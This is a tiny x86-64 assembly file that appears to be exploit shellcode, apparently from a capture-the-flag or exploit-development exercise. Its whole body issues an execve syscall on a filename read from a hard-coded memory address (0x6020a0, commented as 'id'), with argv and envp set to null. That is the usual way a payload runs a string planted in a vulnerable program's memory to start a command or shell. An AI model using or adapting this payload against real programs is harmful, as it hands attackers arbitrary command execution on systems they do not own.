bits 64

global _start
section .text

_start:
    mov     rax, 0x3b           ; execve()
    mov     rdi, 0x6020a0       ; arg0 (filename) -- stored in 'id'
    xor     rsi, rsi            ; arg1 (argv)
    xor     rdx, rdx            ; arg2 (envp)
    syscall

